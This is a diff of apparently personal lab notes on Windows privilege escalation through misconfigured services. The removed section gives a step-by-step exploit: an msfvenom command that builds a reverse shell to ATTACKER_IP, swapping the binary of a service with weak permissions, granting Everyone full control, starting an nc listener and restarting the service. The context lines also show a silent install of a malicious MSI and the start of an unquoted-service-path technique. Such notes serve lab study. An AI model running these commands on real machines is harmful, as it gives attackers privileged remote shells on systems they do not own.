@@ -42,18 +42,6 @@
 
      msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 
-  #### win service - insecure permission on sercie executable -- msf requied for creating a reverse shell file 
-    sc qc xxx // to check info of a particular service, we'll have the binary file path, the executed accountname.
-    icacls Path:\xxx  //check the privi of this binary file of this serviice
-
-    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe //create shell file and transfer to the host
-    move C:\Users\thm-unpriv\rev-svc.exe WService.exe  //raap[lace the binary file
-    icacls WService.exe /grant Everyone:F  // grant full privi 
-    nc -nvlp xxxx 
-
-    sc stop xxxservice
-    sc start xxxservice  //restart this service to trigger shell // PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.
-
   #### win service - Unquoted Service Paths - msf requied for creating a reverse shell file 
     sc qc "disk sorter enterprise"  
       DISPLAY_NAME       : Disk Sorter Enterprise  //spaces on the name of the "Disk Sorter Enterprise" folder
